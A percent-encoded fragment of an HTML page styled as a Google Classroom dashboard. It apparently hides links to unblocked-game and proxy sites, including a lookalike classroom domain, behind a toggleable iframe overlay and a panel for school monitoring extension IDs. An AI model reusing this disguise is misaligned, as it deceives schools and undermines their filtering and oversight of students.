%2D%32%30%30%22%20%73%74%79%6C%65%3D%22%74%72%61%6E%73%66%6F%72%6D%3A%20%72%6F%74%61%74%65%28%2D%39%30%64%65%67%29%3B%22%3E%3C%2F%69%3E%0A%20%20%20%20%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%3C%64%69%76%20%69%64%3D%22%65%6E%72%6F%6C%6C%65%64%4C%69%73%74%22%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%66%6C%65%78%2D%63%6F%6C%20%73%70%61%63%65%2D%79%2D%31%20%6D%74%2D%31%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%3B%22%3E%0A%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%74%65%67%6F%72%79%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%74%65%67%6F%72%79%2D%68%65%61%64%65%72%22%3E%47%61%6D%65%73%20%3C%69%20%63%6C%61%73%73%3D%22%66%61%73%20%66%61%2D%63%68%65%76%72%6F%6E%2D%64%6F%77%6E%20%74%65%78%74%2D%78%73%22%20%73%74%79%6C%65%3D%22%74%72%61%6E%73%66%6F%72%6D%3A%20%72%6F%74%61%74%65%28%2D%39%30%64%65%67%29%3B%22%3E%3C%2F%69%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%74%65%67%6F%72%79%2D%6C%69%73%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%61%20%69%64%3D%22%6E%75%6C%6C%4C%69%6E%6B%22%20%64%61%74%61%2D%75%72%6C%3D%22%68%74%74%70%73%3A%2F%2F%6E%75%6C%6C%78%69%65%74%79%2E%63%6F%6D%2F%22%20%63%6C%61%73%73%3D%22%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%61%20%69%64%3D%22%74%6F%74%61%6C%6C%79%4C%69%6E%6B%22%20%64%61%74%61%2D%75%72%6C%3D%22%68%74%74%70%73%3A%2F%2F%77%65%73%6C%61%63%6B%2E%63%6F%6D%2F%22%20%63%6C%61%73%73%3D%22%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%61%20%69%64%3D%22%73%63%69%65%6E%63%65%4C%69%6E%6B%22%20%64%61%74%61%2D%75%72%6C%3D%22%68%74%74%70%73%3A%2F%2F%74%6F%74%61%6C%6C%79%73%63%69%65%6E%63%65%2E%61%70%70%2F%22%20%63%6C%61%73%73%3D%22%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%61%20%69%64%3D%22%67%6E%4C%69%6E%6B%22%20%64%61%74%61%2D%75%72%6C%3D%22%68%74%74%70%73%3A%2F%2F%67%6E%2D%6D%61%74%68%2E%67%69%74%68%75%62%2E%69%6F%2F%22%20%63%6C%61%73%73%3D%22%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%61%20%69%64%3D%22%65%6E%67%6C%69%73%68%4C%69%6E%6B%22%20%64%61%74%61%2D%75%72%6C%3D%22%68%74%74%70%73%3A%2F%2F%77%77%77%2E%6A%75%6C%69%6F%73%2E%67%61%6D%65%73%2F%68%6F%6D%65%22%20%63%6C%61%73%73%3D%22%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%74%65%67%6F%72%79%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%74%65%67%6F%72%79%2D%68%65%61%64%65%72%22%3E%42%72%6F%77%73%65%72%2B%47%61%6D%65%73%20%3C%69%20%63%6C%61%73%73%3D%22%66%61%73%20%66%61%2D%63%68%65%76%72%6F%6E%2D%64%6F%77%6E%20%74%65%78%74%2D%78%73%22%20%73%74%79%6C%65%3D%22%74%72%61%6E%73%66%6F%72%6D%3A%20%72%6F%74%61%74%65%28%2D%39%30%64%65%67%29%3B%22%3E%3C%2F%69%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%74%65%67%6F%72%79%2D%6C%69%73%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%61%20%69%64%3D%22%62%72%6F%77%73%65%72%4C%69%6E%6B%22%20%64%61%74%61%2D%75%72%6C%3D%22%68%74%74%70%73%3A%2F%2F%62%65%73%74%2D%66%6F%72%63%65%2D%37%33%34%2E%6E%6F%77%67%67%2E%6D%65%2F%22%20%63%6C%61%73%73%3D%22%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%61%20%69%64%3D%22%73%70%61%63%65%4C%69%6E%6B%22%20%64%61%74%61%2D%75%72%6C%3D%22%68%74%74%70%73%3A%2F%2F%65%72%62%79%74%65%73%2E%68%6F%73%74%32%67%6F%2E%6E%65%74%2F%22%20%63%6C%61%73%73%3D%22%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%61%20%69%64%3D%22%72%61%6E%64%6F%6D%4C%69%6E%6B%22%20%64%61%74%61%2D%75%72%6C%3D%22%68%74%74%70%73%3A%2F%2F%73%74%75%64%79%2E%69%6E%66%6F%2E%6E%6F%72%74%68%2D%6B%61%7A%61%6B%68%73%74%61%6E%2E%73%75%2F%22%20%63%6C%61%73%73%3D%22%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%61%20%69%64%3D%22%75%74%6F%70%69%61%32%4C%69%6E%6B%22%20%64%61%74%61%2D%75%72%6C%3D%22%68%74%74%70%73%3A%2F%2F%6D%65%74%61%2D%67%61%6D%65%73%2D%70%72%6F%78%69%65%73%2E%63%72%61%62%64%61%6E%63%65%2E%63%6F%6D%2F%22%20%63%6C%61%73%73%3D%22%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%61%20%69%64%3D%22%75%74%6F%70%69%61%33%4C%69%6E%6B%22%20%64%61%74%61%2D%75%72%6C%3D%22%68%74%74%70%73%3A%2F%2F%62%6F%6D%62%62%6F%6D%62%62%6F%6D%62%69%72%61%6E%2E%72%75%68%65%7A%65%69%74%65%72%2E%63%68%2F%22%20%63%6C%61%73%73%3D%22%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%61%20%69%64%3D%22%75%74%6F%70%69%61%4C%69%6E%6B%22%20%64%61%74%61%2D%75%72%6C%3D%22%68%74%74%70%73%3A%2F%2F%63%6C%61%73%73%72%6F%6F%6D%2E%67%6F%6F%67%6C%65%2E%63%6F%6D%2E%6D%79%2E%74%6F%2F%22%20%63%6C%61%73%73%3D%22%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%61%20%69%64%3D%22%75%74%6F%70%69%61%4C%69%6E%6B%22%20%64%61%74%61%2D%75%72%6C%3D%22%68%74%74%70%73%3A%2F%2F%61%70%70%6C%79%2E%66%72%65%65%64%69%64%64%79%2E%69%6E%66%6F%2F%22%20%63%6C%61%73%73%3D%22%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%61%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%67%61%70%2D%33%20%70%78%2D%33%20%70%79%2D%32%20%72%6F%75%6E%64%65%64%2D%6C%67%20%74%65%78%74%2D%67%72%61%79%2D%37%30%30%20%74%65%78%74%2D%73%6D%20%66%6F%6E%74%2D%6E%6F%72%6D%61%6C%20%68%6F%76%65%72%3A%62%67%2D%67%72%61%79%2D%31%30%30%20%73%65%6C%65%63%74%2D%6E%6F%6E%65%22%20%68%72%65%66%3D%22%23%22%3E%3C%69%20%63%6C%61%73%73%3D%22%66%61%72%20%66%61%2D%66%6F%6C%64%65%72%20%74%65%78%74%2D%73%6D%22%3E%3C%2F%69%3E%20%41%72%63%68%69%76%65%64%20%63%6C%61%73%73%65%73%3C%2F%61%3E%0A%20%20%20%20%3C%61%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%67%61%70%2D%33%20%70%78%2D%33%20%70%79%2D%32%20%72%6F%75%6E%64%65%64%2D%6C%67%20%74%65%78%74%2D%67%72%61%79%2D%37%30%30%20%74%65%78%74%2D%73%6D%20%66%6F%6E%74%2D%6E%6F%72%6D%61%6C%20%68%6F%76%65%72%3A%62%67%2D%67%72%61%79%2D%31%30%30%20%73%65%6C%65%63%74%2D%6E%6F%6E%65%22%20%68%72%65%66%3D%22%23%22%3E%3C%69%20%63%6C%61%73%73%3D%22%66%61%73%20%66%61%2D%63%6F%67%20%74%65%78%74%2D%73%6D%22%3E%3C%2F%69%3E%20%53%65%74%74%69%6E%67%73%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%78%73%20%66%6F%6E%74%2D%6E%6F%72%6D%61%6C%20%6D%6C%2D%61%75%74%6F%22%3E%3A%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%0A%20%20%3C%2F%6E%61%76%3E%0A%3C%2F%61%73%69%64%65%3E%0A%0A%3C%21%2D%2D%20%4D%61%69%6E%20%2D%2D%3E%0A%3C%6D%61%69%6E%20%63%6C%61%73%73%3D%22%66%6C%65%78%2D%31%20%70%2D%36%20%6F%76%65%72%66%6C%6F%77%2D%61%75%74%6F%22%3E%0A%20%20%3C%68%65%61%64%65%72%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%6A%75%73%74%69%66%79%2D%65%6E%64%20%67%61%70%2D%36%20%6D%62%2D%36%22%3E%0A%20%20%20%20%3C%62%75%74%74%6F%6E%20%61%72%69%61%2D%6C%61%62%65%6C%3D%22%43%72%65%61%74%65%22%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%6A%75%73%74%69%66%79%2D%63%65%6E%74%65%72%20%77%2D%38%20%68%2D%38%20%74%65%78%74%2D%67%72%61%79%2D%37%30%30%20%68%6F%76%65%72%3A%62%67%2D%67%72%61%79%2D%32%30%30%20%72%6F%75%6E%64%65%64%2D%66%75%6C%6C%20%74%72%61%6E%73%69%74%69%6F%6E%2D%63%6F%6C%6F%72%73%20%64%75%72%61%74%69%6F%6E%2D%32%30%30%22%3E%0A%20%20%20%20%20%20%3C%73%76%67%20%61%72%69%61%2D%68%69%64%64%65%6E%3D%22%74%72%75%65%22%20%63%6C%61%73%73%3D%22%77%2D%35%20%68%2D%35%22%20%66%69%6C%6C%3D%22%6E%6F%6E%65%22%20%73%74%72%6F%6B%65%3D%22%63%75%72%72%65%6E%74%43%6F%6C%6F%72%22%20%73%74%72%6F%6B%65%2D%77%69%64%74%68%3D%22%32%22%20%76%69%65%77%42%6F%78%3D%22%30%20%30%20%32%34%20%32%34%22%3E%3C%70%61%74%68%20%64%3D%22%4D%31%32%20%35%76%31%34%4D%35%20%31%32%68%31%34%22%20%73%74%72%6F%6B%65%2D%6C%69%6E%65%63%61%70%3D%22%72%6F%75%6E%64%22%20%73%74%72%6F%6B%65%2D%6C%69%6E%65%6A%6F%69%6E%3D%22%72%6F%75%6E%64%22%3E%3C%2F%70%61%74%68%3E%3C%2F%73%76%67%3E%0A%20%20%20%20%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%3C%62%75%74%74%6F%6E%20%61%72%69%61%2D%6C%61%62%65%6C%3D%22%41%70%70%73%22%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%67%72%61%79%2D%37%30%30%20%66%6F%6E%74%2D%6C%69%67%68%74%20%68%6F%76%65%72%3A%62%67%2D%67%72%61%79%2D%32%30%30%20%72%6F%75%6E%64%65%64%2D%66%75%6C%6C%20%77%2D%38%20%68%2D%38%20%66%6C%65%78%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%6A%75%73%74%69%66%79%2D%63%65%6E%74%65%72%22%3E%0A%20%20%20%20%20%20%3C%73%76%67%20%61%72%69%61%2D%68%69%64%64%65%6E%3D%22%74%72%75%65%22%20%63%6C%61%73%73%3D%22%77%2D%34%20%68%2D%34%22%20%66%69%6C%6C%3D%22%23%35%66%36%33%36%38%22%20%76%69%65%77%42%6F%78%3D%22%30%20%30%20%32%34%20%32%34%22%3E%3C%63%69%72%63%6C%65%20%63%78%3D%22%34%2E%35%22%20%63%79%3D%22%34%2E%35%22%20%72%3D%22%32%2E%35%22%2F%3E%3C%63%69%72%63%6C%65%20%63%78%3D%22%31%32%22%20%63%79%3D%22%34%2E%35%22%20%72%3D%22%32%2E%35%22%2F%3E%3C%63%69%72%63%6C%65%20%63%78%3D%22%31%39%2E%35%22%20%63%79%3D%22%34%2E%35%22%20%72%3D%22%32%2E%35%22%2F%3E%3C%63%69%72%63%6C%65%20%63%78%3D%22%34%2E%35%22%20%63%79%3D%22%31%32%22%20%72%3D%22%32%2E%35%22%2F%3E%3C%63%69%72%63%6C%65%20%63%78%3D%22%31%32%22%20%63%79%3D%22%31%32%22%20%72%3D%22%32%2E%35%22%2F%3E%3C%63%69%72%63%6C%65%20%63%78%3D%22%31%39%2E%35%22%20%63%79%3D%22%31%32%22%20%72%3D%22%32%2E%35%22%2F%3E%3C%63%69%72%63%6C%65%20%63%78%3D%22%34%2E%35%22%20%63%79%3D%22%31%39%2E%35%22%20%72%3D%22%32%2E%35%22%2F%3E%3C%63%69%72%63%6C%65%20%63%78%3D%22%31%32%22%20%63%79%3D%22%31%39%2E%35%22%20%72%3D%22%32%2E%35%22%2F%3E%3C%63%69%72%63%6C%65%20%63%78%3D%22%31%39%2E%35%22%20%63%79%3D%22%31%39%2E%35%22%20%72%3D%22%32%2E%35%22%2F%3E%3C%2F%73%76%67%3E%0A%20%20%20%20%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%3C%62%75%74%74%6F%6E%20%69%64%3D%22%70%72%6F%66%69%6C%65%42%74%6E%22%20%61%72%69%61%2D%6C%61%62%65%6C%3D%22%55%73%65%72%20%70%72%6F%66%69%6C%65%22%20%63%6C%61%73%73%3D%22%77%2D%38%20%68%2D%38%20%72%6F%75%6E%64%65%64%2D%66%75%6C%6C%20%66%6C%65%78%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%6A%75%73%74%69%66%79%2D%63%65%6E%74%65%72%20%74%65%78%74%2D%77%68%69%74%65%20%66%6F%6E%74%2D%73%65%6D%69%62%6F%6C%64%20%73%65%6C%65%63%74%2D%6E%6F%6E%65%20%63%75%72%73%6F%72%2D%70%6F%69%6E%74%65%72%22%20%74%69%74%6C%65%3D%22%43%6C%69%63%6B%20%74%6F%20%63%68%61%6E%67%65%20%70%72%6F%66%69%6C%65%20%63%6F%6C%6F%72%2F%6C%65%74%74%65%72%22%3E%0A%20%20%20%20%20%20%3C%73%70%61%6E%20%69%64%3D%22%70%72%6F%66%69%6C%65%4C%65%74%74%65%72%22%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%73%6D%20%6C%65%61%64%69%6E%67%2D%6E%6F%6E%65%22%3E%20%3C%2F%73%70%61%6E%3E%0A%20%20%20%20%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%3C%2F%68%65%61%64%65%72%3E%0A%0A%20%20%3C%73%65%63%74%69%6F%6E%20%61%72%69%61%2D%6C%61%62%65%6C%3D%22%43%6C%61%73%73%72%6F%6F%6D%20%63%61%72%64%73%22%20%63%6C%61%73%73%3D%22%67%72%69%64%20%67%72%69%64%2D%63%6F%6C%73%2D%31%20%73%6D%3A%67%72%69%64%2D%63%6F%6C%73%2D%32%20%6D%64%3A%67%72%69%64%2D%63%6F%6C%73%2D%33%20%67%61%70%2D%36%22%3E%0A%20%20%20%20%3C%73%63%72%69%70%74%3E%0A%20%20%20%20%20%20%66%6F%72%28%6C%65%74%20%69%3D%30%3B%69%3C%35%3B%69%2B%2B%29%7B%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%60%3C%61%72%74%69%63%6C%65%20%63%6C%61%73%73%3D%22%62%67%2D%77%68%69%74%65%20%72%6F%75%6E%64%65%64%2D%6C%67%20%62%6F%72%64%65%72%20%62%6F%72%64%65%72%2D%67%72%61%79%2D%32%30%30%20%73%68%61%64%6F%77%2D%73%6D%20%70%2D%34%20%66%6C%65%78%20%66%6C%65%78%2D%63%6F%6C%20%6A%75%73%74%69%66%79%2D%62%65%74%77%65%65%6E%20%6D%69%6E%2D%68%2D%5B%31%38%30%70%78%5D%22%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%6A%75%73%74%69%66%79%2D%62%65%74%77%65%65%6E%20%69%74%65%6D%73%2D%73%74%61%72%74%20%6D%62%2D%34%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%73%70%61%63%65%2D%79%2D%32%20%77%2D%33%2F%34%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%68%2D%33%20%73%6B%65%6C%65%74%6F%6E%20%77%2D%32%2F%33%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%68%2D%33%20%73%6B%65%6C%65%74%6F%6E%20%77%2D%31%2F%32%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%72%6F%75%6E%64%65%64%2D%66%75%6C%6C%20%62%67%2D%67%72%61%79%2D%32%30%30%20%77%2D%31%32%20%68%2D%31%32%20%66%6C%65%78%2D%73%68%72%69%6E%6B%2D%30%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%68%72%20%63%6C%61%73%73%3D%22%62%6F%72%64%65%72%2D%67%72%61%79%2D%32%30%30%20%6D%62%2D%33%22%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%21%2D%2D%20%76%6F%74%65%73%20%73%65%63%74%69%6F%6E%20%72%65%6D%6F%76%65%64%20%2D%2D%3E%0A%20%20%20%20%20%20%20%20%3C%2F%61%72%74%69%63%6C%65%3E%60%29%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%3C%2F%73%63%72%69%70%74%3E%0A%20%20%3C%2F%73%65%63%74%69%6F%6E%3E%0A%3C%2F%6D%61%69%6E%3E%0A%0A%3C%64%69%76%20%69%64%3D%22%6D%6F%6E%69%74%6F%72%2D%73%74%61%74%75%73%22%3E%3D%34%3C%2F%64%69%76%3E%0A%3C%64%69%76%20%69%64%3D%22%6D%6F%6E%69%74%6F%72%2D%63%75%73%74%6F%6D%2D%69%64%2D%69%6E%70%75%74%22%3E%0A%20%20%20%20%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%74%65%78%74%22%20%69%64%3D%22%6D%6F%6E%69%74%6F%72%2D%63%75%73%74%6F%6D%2D%65%78%74%2D%69%64%22%20%70%6C%61%63%65%68%6F%6C%64%65%72%3D%22%45%6E%74%65%72%20%63%75%73%74%6F%6D%20%65%78%74%65%6E%73%69%6F%6E%20%49%44%22%3E%0A%20%20%20%20%3C%62%75%74%74%6F%6E%20%6F%6E%63%6C%69%63%6B%3D%22%6D%6F%6E%69%74%6F%72%41%64%64%43%75%73%74%6F%6D%49%64%28%29%22%3E%41%64%64%3C%2F%62%75%74%74%6F%6E%3E%0A%3C%2F%64%69%76%3E%0A%3C%64%69%76%20%69%64%3D%22%6D%6F%6E%69%74%6F%72%2D%64%65%62%75%67%2D%6C%6F%67%22%3E%3C%2F%64%69%76%3E%0A%0A%3C%64%69%76%20%69%64%3D%22%69%66%72%61%6D%65%4F%76%65%72%6C%61%79%22%3E%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%22%20%61%6C%6C%6F%77%66%75%6C%6C%73%63%72%65%65%6E%20%61%6C%6C%6F%77%3D%22%66%75%6C%6C%73%63%72%65%65%6E%22%3E%3C%2F%69%66%72%61%6D%65%3E%3C%2F%64%69%76%3E%0A%3C%21%2D%2D%20%54%6F%67%67%6C%65%20%62%75%74%74%6F%6E%20%2D%2D%3E%0A%3C%64%69%76%20%69%64%3D%22%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%22%20%74%69%74%6C%65%3D%22%53%68%6F%77%2F%48%69%64%65%20%69%66%72%61%6D%65%22%3E%0A%20%20%3C%21%2D%2D%20%45%79%65%20%6F%70%65%6E%20%69%63%6F%6E%20%28%64%65%66%61%75%6C%74%29%20%2D%2D%3E%0A%20%20%3C%73%76%67%20%69%64%3D%22%65%79%65%4F%70%65%6E%22%20%78%6D%6C%6E%73%3D%22%68%74%74%70%3A%2F%2F%77%77%77%2E%77%33%2E%6F%72%67%2F%32%30%30%30%2F%73%76%67%22%20%0A%20%20%20%20%20%20%20%77%69%64%74%68%3D%22%32%34%22%20%68%65%69%67%68%74%3D%22%32%34%22%20%76%69%65%77%42%6F%78%3D%22%30%20%30%20%32%34%20%32%34%22%20%66%69%6C%6C%3D%22%6E%6F%6E%65%22%20%0A%20%20%20%20%20%20%20%73%74%72%6F%6B%65%3D%22%62%6C%61%63%6B%22%20%73%74%72%6F%6B%65%2D%77%69%64%74%68%3D%22%32%22%20%73%74%72%6F%6B%65%2D%6C%69%6E%65%63%61%70%3D%22%72%6F%75%6E%64%22%20%73%74%72%6F%6B%65%2D%6C%69%6E%65%6A%6F%69%6E%3D%22%72%6F%75%6E%64%22%3E%0A%20%20%20%20%3C%70%61%74%68%20%64%3D%22%4D%31%20%31%32%73%34%2D%38%20%31%31%2D%38%20%31%31%20%38%20%31%31%20%38%2D%34%20%38%2D%31%31%20%38%2D%31%31%2D%38%2D%31%31%2D%38%7A%22%3E%3C%2F%70%61%74%68%3E%0A%20%20%20%20%3C%63%69%72%63%6C%65%20%63%78%3D%22%31%32%22%20%63%79%3D%22%31%32%22%20%72%3D%22%33%22%3E%3C%2F%63%69%72%63%6C%65%3E%0A%20%20%3C%2F%73%76%67%3E%0A%0A%20%20%3C%21%2D%2D%20%45%79%65%20%63%6C%6F%73%65%64%20%28%68%69%64%64%65%6E%20%61%74%20%66%69%72%73%74%29%20%2D%2D%3E%0A%20%20%3C%73%76%67%20%69%64%3D%22%65%79%65%43%6C%6F%73%65%64%22%20%78%6D%6C%6E%73%3D%22%68%74%74%70%3A%2F%2F%77%77%77%2E%77%33%2E%6F%72%67%2F%32%30%30%30%2F%73%76%67%22%0A%20%20%20%20%20%20%20%77%69%64%74%68%3D%22%32%34%22%20%68%65%69%67%68%74%3D%22%32%34%22%20%76%69%65%77%42%6F%78%3D%22%30%20%30%20%32%34%20%32%34%22%20%66%69%6C%6C%3D%22%6E%6F%6E%65%22%0A%20%20%20%20%20%20%20%73%74%72%6F%6B%65%3D%22%62%6C%61%63%6B%22%20%73%74%72%6F%6B%65%2D%77%69%64%74%68%3D%22%32%22%20%73%74%72%6F%6B%65%2D%6C%69%6E%65%63%61%70%3D%22%72%6F%75%6E%64%22%20%73%74%72%6F%6B%65%2D%6C%69%6E%65%6A%6F%69%6E%3D%22%72%6F%75%6E%64%22%0A%20%20%20%20%20%20%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%3B%22%3E%0A%20%20%20%20%3C%70%61%74%68%20%64%3D%22%4D%31%37%2E%39%34%20%31%37%2E%39%34%41%31%30%2E%39%34%20%31%30%2E%39%34%20%30%20%30%20%31%20%31%32%20%32%30%63%2D%37%20%30%2D%31%31%2D%38%2D%31%31%2D%38%61%32%31%2E%36%35%20%32%31%2E%36%35%20%30%20%30%20%31%20%35%2E%30%36%2D%36%2E%38%38%4D%39%2E%39%20%34%2E%32%34%41%31%30%2E%39%34%20%31%30%2E%39%34%20%30%20%30%20%31%20%31%32%20%34%63%37%20%30%20%31%31%20%38%20%31%31%20%38%61%32%31%2E%36%35%20%32%31%2E%36%35%20%30%20%30%20%31%2D%32%2E%38%31%20%34%2E%31%39%22%3E%3C%2F%70%61%74%68%3E%0A%20%20%20%20%3C%6C%69%6E%65%20%78%31%3D%22%31%22%20%79%31%3D%22%31%22%20%78%32%3D%22%32%33%22%20%79%32%3D%22%32%33%22%3E%3C%2F%6C%69%6E%65%3E%0A%20%20%3C%2F%73%76%67%3E%0A%3C%2F%64%69%76%3E%0A%0A%3C%73%74%79%6C%65%3E%0A%20%20%2F%2A%20%49%66%72%61%6D%65%20%74%6F%67%67%6C%65%20%62%75%74%74%6F%6E%20%2A%2F%0A%20%20%23%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%20%7B%0A%20%20%20%20%70%6F%73%69%74%69%6F%6E%3A%20%66%69%78%65%64%3B%0A%20%20%20%20%62%6F%74%74%6F%6D%3A%20%32%30%70%78%3B%0A%20%20%20%20%6C%65%66%74%3A%20%32%30%70%78%3B%0A%20%20%20%20%77%69%64%74%68%3A%20%34%30%70%78%3B%0A%20%20%20%20%68%65%69%67%68%74%3A%20%34%30%70%78%3B%0A%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%32%29%3B%20%2F%2A%20%66%72%6F%73%74%65%64%20%67%6C%61%73%73%20%2A%2F%0A%20%20%20%20%62%61%63%6B%64%72%6F%70%2D%66%69%6C%74%65%72%3A%20%62%6C%75%72%28%38%70%78%29%3B%0A%20%20%20%20%2D%77%65%62%6B%69%74%2D%62%61%63%6B%64%72%6F%70%2D%66%69%6C%74%65%72%3A%20%62%6C%75%72%28%38%70%78%29%3B%0A%0A%20%20%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%39%39%39%39%70%78%3B%0A%20%20%20%20%64%69%73%70%6C%61%79%3A%20%66%6C%65%78%3B%20%0A%20%20%20%20%61%6C%69%67%6E%2D%69%74%65%6D%73%3A%20%63%65%6E%74%65%72%3B%0A%20%20%20%20%6A%75%73%74%69%66%79%2D%63%6F%6E%74%65%6E%74%3A%20%63%65%6E%74%65%72%3B%0A%0A%20%20%20%20%63%75%72%73%6F%72%3A%20%70%6F%69%6E%74%65%72%3B%0A%20%20%20%20%7A%2D%69%6E%64%65%78%3A%20%32%31%30%30%3B%20%2F%2A%20%61%62%6F%76%65%20%69%66%72%61%6D%65%20%2A%2F%0A%20%20%20%20%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%62%6F%72%64%65%72%3A%20%31%70%78%20%73%6F%6C%69%64%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%33%29%3B%0A%20%20%7D%0A%0A%20%20%23%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%20%73%76%67%20%7B%0A%20%20%20%20%70%6F%69%6E%74%65%72%2D%65%76%65%6E%74%73%3A%20%6E%6F%6E%65%3B%20%2F%2A%20%6D%61%6B%65%20%63%6C%69%63%6B%73%20%6F%6E%6C%79%20%68%69%74%20%74%68%65%20%62%75%74%74%6F%6E%20%2A%2F%0A%20%20%7D%0A%3C%2F%73%74%79%6C%65%3E%0A%0A%3C%73%63%72%69%70%74%3E%0A%20%20%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%63%6F%6E%73%74%20%62%74%6E%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%22%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%65%79%65%4F%70%65%6E%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%65%79%65%4F%70%65%6E%22%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%65%79%65%43%6C%6F%73%65%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%65%79%65%43%6C%6F%73%65%64%22%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%69%66%72%61%6D%65%73%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%22%69%66%72%61%6D%65%22%29%3